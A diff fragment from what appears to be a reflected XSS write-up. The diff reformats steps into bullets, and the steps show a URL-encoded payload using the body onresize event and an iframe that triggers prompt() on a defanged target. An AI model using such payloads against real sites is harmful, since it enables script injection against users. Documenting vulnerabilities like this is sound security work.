@@ -473,9 +473,9 @@ In this instance, the `/?search` parameter is being reflected into the page as H
    ~~~
 
 5. To make the exploitation more realistic, after going through the unfiltered event attributes:
-   I used an `<iframe>` to embeds this vulnerable webpage (`src="https[://]vulnerable[.]com/`).
-   The query parameter `/?search` then load the URL-encoded payload `%22%3E%3Cbody+onresize=prompt()%3E`
-   `[this.style.width](https://www.w3schools.com/jsref/prop_style_width.asp)` to adjust the iframe’s size, which will trigger the `onresize` event and `prompt()`.
+   - I used an `<iframe>` to embeds this vulnerable webpage (`src="https[://]vulnerable[.]com/`).
+   - The query parameter `/?search` then load the URL-encoded payload `%22%3E%3Cbody+onresize=prompt()%3E`
+   - [this.style.width](https://www.w3schools.com/jsref/prop_style_width.asp) to adjust the iframe’s size, which will trigger the `onresize` event and `prompt()`.
 
    ~~~
    <iframe src="https[://]vulnerable[.]com/?search=%22%3E%3Cbody+onresize=prompt()%3E" onload=this.style.height='88px'></iframe>
